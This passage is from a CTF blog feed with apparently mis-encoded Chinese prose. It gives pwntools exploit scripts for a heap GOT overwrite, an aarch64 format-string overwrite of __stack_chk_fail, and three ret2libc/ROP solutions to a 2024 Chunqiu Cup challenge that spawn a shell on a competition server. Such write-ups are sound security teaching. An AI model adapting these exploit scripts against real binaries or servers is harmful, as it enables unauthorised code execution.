class="string">b&#x27;gggg&#x27;</span>, p64(<span class="number">0x31</span>), <span class="number">1</span>)</span><br><span class="line">    dele(<span class="number">1</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>) + <span class="string">b&#x27;deadbeef&#x27;</span>)</span><br><span class="line">    add1(<span class="string">b&#x27;hhhh&#x27;</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    dele(<span class="number">2</span>, p64(<span class="number">0x4000831000</span> + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="é¢˜ç›®å…­ï¼šaarch64æ¶æ„-æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#é¢˜ç›®å…­ï¼šaarch64æ¶æ„-æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="é¢˜ç›®å…­ï¼šaarch64æ¶æ„ æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>é¢˜ç›®å…­ï¼šaarch64æ¶æ„ æ ¼å¼åŒ–å­—ç¬¦ä¸²<a id="fmt"></a></h1><p>WKCTF2024  something_changed  </p><p>æ¼æ´è¿˜æ˜¯å¾ˆç®€å•ï¼Œå­˜åœ¨æ ˆæº¢å‡ºå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141932654.png" alt="image-20240714193242494"></p><p>ä¸»è¦è¯´ä¸€äº›æ¯”èµ›æ—¶å€™çš„æ€è·¯ï¼š</p><blockquote><p>é€šè¿‡ä¸æ–­æµ‹è¯•è¿œç¨‹printfæ¥æ³„éœ²æ ˆåœ°å€ â€“&gt; å‘ç°æ³„éœ²å‡ºæ¥çš„åœ°å€å›ºå®šä¸å˜  â€“&gt; çŒœæµ‹æ˜¯ç”¨qemuèµ·çš„ç¯å¢ƒ  â€“&gt; ret2shellcodeå¤‡ç€   ä¸è¿‡æ¯æ¬¡è¿æ¥canaryçš„å€¼ä¼šå˜</p><p>qemuèµ·çš„ç¨‹åºç›¸å½“äºä¿æŠ¤å…¨å…³ è€Œä¸”è¿™é“é¢˜æœ¬èº«å°±æ²¡å¼€FULL RELROå’Œpieã€‚è¿˜ç»™äº†backdoor  â€“&gt; ä¼˜å…ˆ ä¸€æ¬¡æ€§æ”¹å¥½ å†æ˜¯æ”¹printfäºŒæ¬¡åˆ©ç”¨</p></blockquote><p>ç›´æ¥ç”¨ä¸€æ¬¡æ€§æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ”¹__stack_chk_fail_gotä¸ºbackdoorå°±è¡Œäº†</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141946475.png" alt="27275487-64e1-4985-9147-f9d421f1d03d"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    <span class="comment"># context.log_level = &#x27;info&#x27;</span></span><br><span class="line">    context.arch = <span class="string">&#x27;aarch64&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;1 1&#x27;</span></span><br><span class="line">    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./silent&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)</span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x04007F4 \n b *0x000400854&quot;)</span></span><br><span class="line">    <span class="comment"># dbg(&quot;b *0x000400854&quot;)</span></span><br><span class="line"></span><br><span class="line">    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span></span><br><span class="line">    backdoor = <span class="number">0x00400770</span></span><br><span class="line">    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)</span><br><span class="line">    sl(payload)</span><br><span class="line">    itr()</span><br><span class="line"><span class="comment">#canary   %19$p</span></span><br></pre></td></tr></table></figure><p>æ‚ä¸ƒæ‚å…«</p><p>printfå‰</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947979.png" alt="image-20240714194505752"></p><p>printfå</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947663.png" alt="image-20240714194737601"></p><p>å¯ä»¥å‘ç°ä» x1å¼€å§‹æ‰“å°ï¼Œåˆ°x7ï¼Œç„¶åå¼€å§‹æ‰“å°æ ˆä¸Šçš„æ•°æ®</p><p>printfçš„æºç æœ‰ç©ºå†çœ‹å’¯ï¼Œå…ˆè´´ä¸€ä½å¸ˆå‚…çš„åšå®¢<a href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%8D%95%E6%AC%A1-printf-%E5%88%A9%E7%94%A8">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨ - WJHâ€™s Blog (wjhwjhn.com)</a>ï¼ŒåŸç†å°±åœ¨è¿™é‡Œã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸€äº›å¸ˆå‚…çš„åšå®¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/ZIKH26/articles/16077191.html&quot;&gt;å…³äºå­¦ä¹ armæ¶æ„ä¸‹çš„pwnçš„æ€»ç»“ - ZikH26 - åšå®¢å›­ (cnblogs.com)&lt;/a&gt;&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    <category term="STU" scheme="http://tw11ty.github.io/categories/STU/"/>
    
    
    <category term="arm" scheme="http://tw11ty.github.io/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>2024æ˜¥ç§‹æ¯å¤å­£èµ›pwn</title>
    <link href="http://tw11ty.github.io/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/"/>
    <id>http://tw11ty.github.io/2024/07/07/2024%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%A4%8F%E5%AD%A3%E8%B5%9Bpwn/</id>
    <published>2024-07-07T04:44:56.000Z</published>
    <updated>2024-11-16T08:35:46.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn"><a href="#2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn" class="headerlink" title="2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn"></a>2024æ˜¥ç§‹æ¯å¤å­£èµ›-pwn</h1><p>awdpæ²¡çœ‹ï¼Œctfåªåšå‡ºæ¥ä¸¤é¢˜ï¼Œè¿˜æœ‰ä¸€é¢˜ç†è®ºå¯è¡Œã€‚</p><blockquote><p>å‚è€ƒåšå®¢ï¼š</p><p><a href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</a></p><p><a href="https://www.cnblogs.com/imarch22/p/18288087#simplesys">2024æ˜¥ç§‹æ¯WP - lmarch2 - åšå®¢å›­ (cnblogs.com)</a></p></blockquote><h1 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h1><p>- <a href="#stdout">stdout</a></p><ul><li><a href="#first">è§£æ³•ä¸€</a></li><li><a href="#second">è§£æ³•äºŒ</a></li><li><a href="#third">è§£æ³•ä¸‰</a></li></ul><p>- <a href="#Shuffled_Execution">Shuffled_Execution</a></p><p>- <a href="#Save_the_preceniss">Save the preceniss</a></p><ul><li><a href="#fail">ä¸å¯èƒ½çš„çˆ†ç ´â€¦</a></li><li><a href="#success">æ­£ç¡®è§£æ³•</a></li></ul><h2 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout<a id="stdout"></a></h2><p>libcç‰ˆæœ¬ï¼šUbuntu GLIBC 2.31-0ubuntu9.9</p><p>ä¸»å‡½æ•°æº¢å‡º0x10å­—èŠ‚ï¼Œèƒ½è¦†ç›–åˆ°ret_addrï¼›ç¨‹åºä¸­æœ‰vulnå‡½æ•°ï¼Œæº¢å‡º 0x200-0x20 å­—èŠ‚</p><p>åˆå§‹åŒ–å‡½æ•°ä¸­   setvbuf(stdout, 0LL, 0, 0LL)è®¾ç½®ä¸ºäº†æ ‡å‡†è¾“å‡ºæ— ç¼“å†²ï¼Œsetvbuf(stdin, 0LL, 2, 0LL)è¿˜æ˜¯æ­£å¸¸è¾“å‡º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹äº†å…¶ä»–å¸ˆå‚…çš„ï¼Œæ•´ç†å‡ºæ¥ä¸‰ç§è§£æ³•ï¼š</p><h3 id="è§£æ³•ä¸€"><a href="#è§£æ³•ä¸€" class="headerlink" title="è§£æ³•ä¸€"></a>è§£æ³•ä¸€<a id="first"></a></h3><p>æ¯æ¬¡åå…­åˆ†ä¹‹ä¸€çš„æ¦‚ç‡ï¼Œçˆ†ç ´stdoutâ€“&gt;_IO_2_1_stderr_ï¼Œç„¶åå°±èƒ½æ­£å¸¸æ‰“å°ï¼Œå†æ‰“ret2libc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">            vuln     = <span class="number">0x0040125D</span></span><br><span class="line">            prdi     = <span class="number">0x00000000004013d3</span></span><br><span class="line">            prsi_r15 = <span class="number">0x00000000004013d1</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># debug(&#x27;b *0x401286&#x27;)</span></span><br><span class="line">            s( <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x58</span> + p64(vuln))</span><br><span class="line">            payload  = p64(prdi) + p64(<span class="number">0</span>) + p64(prsi_r15) + p64(<span class="number">0x00404070</span>) + p64(<span class="number">0</span>) + p64(elf.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">            payload +=  p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(vuln)</span><br><span class="line">            payload  = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + payload</span><br><span class="line">            sl(payload)</span><br><span class="line"></span><br><span class="line">            s(p16(<span class="number">0x95c0</span>))</span><br><span class="line"></span><br><span class="line">            puts_addr = uu64(io.recv(<span class="number">6</span>, timeout=<span class="number">0.5</span>))</span><br><span class="line">            <span class="keyword">if</span> puts_addr:</span><br><span class="line">                log.success(<span class="string">&quot;===The attack was successful===&quot;</span>)</span><br><span class="line">                libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">                system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">                bin_bash  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">                leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">                leak(<span class="string">&quot;puts_addr&quot;</span>, puts_addr)</span><br><span class="line">                payload   = cyclic(<span class="number">0x28</span>) + p64(prdi) + p64(bin_bash) + p64(system)</span><br><span class="line">                <span class="comment"># sleep(0.5)</span></span><br><span class="line">                sl(payload)</span><br><span class="line">                itr()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            io.close()</span><br><span class="line">            log.failure(<span class="string">&quot;...The attack failed...&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="è§£æ³•äºŒ"><a href="#è§£æ³•äºŒ" class="headerlink" title="è§£æ³•äºŒ"></a>è§£æ³•äºŒ<a id="second"></a></h3><p>ä¸‹é¢è¿™ä½å¸ˆå‚…çš„è§£æ³•ï¼š<a href="https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/">https://starrysky1004.github.io/2024/07/05/2024-shu-qi-xue-xi-ji-lu/</a></p><p><a href="https://blog.csdn.net/AtomTeam/article/details/139672122">2024å…¨å›½å¤§å­¦ç”Ÿä¿¡æ¯å®‰å…¨ç«èµ›ï¼ˆciscnï¼‰åŠå†³èµ›ï¼ˆä¸œåŒ—èµ›åŒºï¼‰Pwné¢˜è§£_2024ciscnåä¸œåŒ—èµ›åŒºwp-CSDNåšå®¢</a></p><blockquote><p><strong>setvbuf</strong></p><ul><li>å…¨ç¼“å†²ï¼š0ï¼Œ<strong>ç¼“å†²åŒºæ»¡</strong> æˆ– <strong>è°ƒç”¨fflush()</strong> åè¾“å‡ºç¼“å†²åŒºå†…å®¹ã€‚</li><li>è¡Œç¼“å†²ï¼š1ï¼Œ<strong>ç¼“å†²åŒºæ»¡</strong> æˆ– <strong>é‡åˆ°æ¢è¡Œç¬¦</strong> æˆ– <strong>è°ƒç”¨fflush()</strong> åè¾“å‡ºç¼“å†²åŒºå†…å®¹ã€‚</li><li>æ— ç¼“å†²ï¼š2ï¼Œç›´æ¥è¾“å‡ºã€‚</li></ul><p>å…¨ç¼“å†²åº”å¯¹æ–¹æ³•ï¼š</p><ul><li>è°ƒç”¨setvbufè®¾ç½®ä¸ºæ— ç¼“å†²çš„stdout</li><li>è°ƒç”¨fflushå‡½æ•°åˆ·æ–°ç¼“å†²åŒº</li><li>å¡«æ»¡ç¼“å†²åŒºï¼Œç¨‹åºä¼šå°†æ‰€æœ‰çš„ç¼“å†²åŒºå†…å®¹å…¨éƒ¨è¾“å‡º</li></ul></blockquote><p>è¿™ä½å¸ˆå‚…å°±æ˜¯åˆ©ç”¨ç¨‹åºä¸­çš„extend()å‡½æ•°æ¥å¡«æ»¡ç¼“å†²åŒºæ¥æ‹¿libc</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071403848.png" alt="image-20240707140349798"></p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071418049.png" alt="image-20240707141852935"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    vuln     = <span class="number">0x0040125D</span></span><br><span class="line">    prdi     = <span class="number">0x00000000004013d3</span></span><br><span class="line">    ret      = prdi + <span class="number">1</span></span><br><span class="line">    prsi_r15 = <span class="number">0x00000000004013d1</span></span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">0x58</span>) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">    s(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">150</span>):</span><br><span class="line">        payload = cyclic(<span class="number">0x28</span>) + p64(elf.sym[<span class="string">&#x27;extend&#x27;</span>]) + p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line">        sl(payload)</span><br><span class="line">        success(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = io.recvuntil(<span class="string">b&#x27;hello!\n&#x27;</span>, timeout=<span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> res:</span><br><span class="line">                libc_base = uu64(r64()) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.error(<span class="string">f&quot;...error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    leak(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    system    = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    bin_bash  = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    payload   = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span> + p64(prdi) + p64(bin_bash) + p64(system)</span><br><span class="line">    sl(payload)</span><br><span class="line">    leak(<span class="string">&quot;system&quot;</span>, system)</span><br><span class="line"></span><br><span class="line">    itr()</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    <span class="comment"># leak(&quot;puts_addr&quot;, puts_addr)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="è§£æ³•ä¸‰"><a href="#è§£æ³•ä¸‰" class="headerlink" title="è§£æ³•ä¸‰"></a>è§£æ³•ä¸‰<a id="third"></a></h3><p>å‚è€ƒè¿™ä½å¸ˆå‚…çš„åšå®¢ï¼š<a href="https://www.cnblogs.com/imarch22/p/18288087#simplesys">2024æ˜¥ç§‹æ¯WP - lmarch2 - åšå®¢å›­ (cnblogs.com)</a></p><p>åœ¨setvbufé™„è¿‘æ‰¾åˆ°syscallï¼Œreadè°ƒraxï¼Œç„¶ååˆ©ç”¨csuè°ƒå¯„å­˜å™¨ã€è°ƒåˆ°syscallæ‰§è¡Œexecve(â€˜&#x2F;bin&#x2F;sh\x00â€™)</p><p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407071508360.png" alt="image-20240707150839242"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tw11ty <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import *</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rdi, rsi, rdx, func_addr</span>):</span><br><span class="line">    payload = p64(csu1) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(rdi) + p64(rsi) + p64(rdx) + p64(func_addr) + p64(csu2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:00000000004013B0 loc_4013B0:                             ; CODE XREF: __libc_csu_init+54â†“j</span></span><br><span class="line"><span class="comment"># .text:00000000004013B0                 mov     rdx, r14</span></span><br><span class="line"><span class="comment"># .text:00000000004013B3                 mov     rsi, r13</span></span><br><span class="line"><span class="comment"># .text:00000000004013B6                 mov     edi, r12d</span></span><br><span class="line"><span class="comment"># .text:00000000004013B9                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span></span><br><span class="line"><span class="comment"># .text:00000000004013BD                 add     rbx, 1</span></span><br><span class="line"><span class="comment"># .text:00000000004013C1                 cmp     rbp, rbx</span></span><br><span class="line"><span class="comment"># .text:00000000004013C4                 jnz     short loc_4013B0</span></span><br><span class="line"><span class="comment"># .text:00000000004013C6</span></span><br><span class="line"><span class="comment"># .text:00000000004013C6 loc_4013C6:                             ; CODE XREF: __libc_csu_init+35â†‘j</span></span><br><span class="line"><span class="comment"># .text:00000000004013C6                 add     rsp, 8</span></span><br><span class="line"><span class="comment"># .text:00000000004013CA                 pop     rbx</span></span><br><span class="line"><span class="comment"># .text:00000000004013CB                 pop     rbp</span></span><br><span class="line"><span class="comment"># .text:00000000004013CC                 pop     r12</span></span><br><span class="line"><span class="comment"># .text:00000000004013CE                 pop     r13</span></span><br><span class="line"><span class="comment"># .text:00000000004013D0                 pop     r14</span></span><br><span class="line"><span class="comment"># .text:00000000004013D2                 pop     r15</span></span><br><span class="line"><span class="comment"># .text:00000000004013D4                 retn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :</span><br><span class="line">    context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line">    IPort = <span class="string">&#x27;8.147.134.120 13093&#x27;</span></span><br><span class="line">    pwnfile = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">    libc_name = <span class="string">&#x27;/ctf/work/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6&#x27;</span> </span><br><span class="line">    <span class="comment"># libc_name = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    elf  = ELF(pwnfile)</span><br><span class="line">    rop  = ROP(pwnfile)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    io = init(pwnfile, IPort, libc_name)</span><br><span class="line"></span><br><span class="line">    extend      = <span class="number">0x401287</span></span><br><span class="line">    vuln        = <span class="number">0x40125D</span></span><br><span class="line">    main        = <span class="number">0x401333</span></span><br><span class="line">    flag        = <span class="number">0x404070</span> + <span class="number">0x100</span></span><br><span class="line">    read_plt    = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    setvbuf_got = elf.got[<span class="string">&#x27;setvbuf&#x27;</span>]</span><br><span class="line">    prsi_r15    = <span class="number">0x00000000004013d1</span></span><br><span class="line">    prdi        = <span class="number">0x00000000004013d3</span></span><br><span class="line">    